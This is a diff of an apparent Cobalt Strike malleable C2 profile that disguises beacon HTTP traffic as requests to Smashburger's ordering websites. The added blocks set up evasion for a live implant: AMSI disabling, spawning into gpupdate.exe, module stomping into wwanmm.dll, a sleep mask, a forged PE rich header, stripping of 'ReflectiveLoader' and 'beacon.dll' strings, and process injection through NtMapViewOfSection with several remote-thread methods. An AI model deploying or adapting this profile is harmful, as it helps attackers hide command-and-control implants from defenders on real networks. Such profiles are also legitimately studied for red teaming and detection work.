@@ -1,5 +1,4 @@
 #trevorforget
-#smashburger - online order - milkshake anyone?
 #xx0hcd
 
 set sleeptime "30000";
@@ -8,6 +7,21 @@ set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Geck
 set dns_idle "8.8.8.8";
 set maxdns    "235";
 
+#custom cert
+#https-certificate {
+#    set keystore "your_store_file.store";
+#    set password "your_store_pass";
+#}
+
+http-config {
+#    set headers "Server, Content-Type, Cache-Control, Connection";
+#    header "Content-Type" "text/html;charset=UTF-8";
+#    header "Connection" "close";
+#    header "Cache-Control" "max-age=2";
+#    header "Server" "nginx";
+    #set "true" if teamserver is behind redirector
+    set trust_x_forwarded_for "false";
+}
 
 http-get {
     
@@ -15,7 +29,7 @@ http-get {
     
     client {
 
-	header "Host" "locations.smashburger.com";
+#	header "Host" "locations.smashburger.com";
 	header "Accept" "*/*";
 	header "Accept-Language" "en-US,en;q=0.5";
 	header "Referer" "https://locations.smashburger.com/us/ky/louisville.html";
@@ -62,7 +76,7 @@ http-post {
 
     client {
 
-	header "Host" "smashburger.alohaorderonline.com";
+#	header "Host" "smashburger.alohaorderonline.com";
 	header "Accept" "*/*";    
 	header "Accept-Language" "en-US,en;q=0.5";
 	header "X-Requested-With" "XMLHttpRequest";
@@ -117,7 +131,7 @@ http-stager {
 
     client {
 
-	header "Host" "smashburger.alohaorderonline.com";
+#	header "Host" "smashburger.alohaorderonline.com";
         header "Accept" "*/*";
 	header "Accept-Language" "en-US,en;q=0.5";
 	header "Referer" "https://locations.smashburger.com/us/ky/louisville/312-s-fourth-st.html";
@@ -146,10 +160,90 @@ http-stager {
 
 }
 
+post-ex {
+
+    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
+    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+
+    set obfuscate "true";
+
+    set smartinject "true";
+
+    set amsi_disable "true";
+
+}
+
+#use peclone on the dll you want to use, this example uses wwanmm.dll. You can also set the values manually.
+#don't use 'set image_size_xx' if using 'set module_xx'. During testing it seemed to double the size of my payload causing module stomp to fail, need to test it out more though.
 stage {
-	set userwx "false";
-	set compile_time "03 Apr 2016 08:12:10";
-	set image_size_x86 "420000";
-	set image_size_x64 "420000";
-	set obfuscate "true";
+    set checksum       "0";
+    set compile_time   "25 Oct 2016 01:57:23";
+    set entry_point    "170000";
+    #set image_size_x86 "6586368";
+    #set image_size_x64 "6586368";
+    #set name	   "WWanMM.dll";
+    set userwx 	   "false";
+    set cleanup	   "true";
+    set sleep_mask	   "true";
+    set stomppe	   "true";
+    set obfuscate	   "true";
+    set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+    
+    #obfuscate beacon before sleep.
+    set sleep_mask "true";
+
+#module stomp. Make sure the dll you use is bigger than your payload and test it with post exploit options to make sure everything is working.
+
+    set module_x86 "wwanmm.dll";
+    set module_x64 "wwanmm.dll";
+
+    transform-x86 {
+        prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.dll" "";
+        }
+
+    transform-x64 {
+        prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.x64.dll" "";
+        }
+
+#can set a string in the .rdata section of the beacon dll.
+    #adds a zero-terminated string
+    #string "something";
+
+    #adds a string 'as-is'
+    #data "something";
+
+    #adds a wide (UTF-16LE encoded) string
+    stringw "something"; 
+}
+
+
+#controls process injection behavior
+process-inject {
+
+    set allocator "NtMapViewOfSection";		
+
+    set min_alloc "16700";
+
+    set userwx "false";  
+    
+    set startrwx "true";
+        
+    transform-x86 {
+        prepend "\x90\x90\x90";
+    }
+    transform-x64 {
+        prepend "\x90\x90\x90";
+    }
+
+    execute {
+        CreateThread "ntdll!RtlUserThreadStart";
+        CreateThread;
+        NtQueueApcThread;
+        CreateRemoteThread;
+        RtlCreateUserThread;
+    }
 }
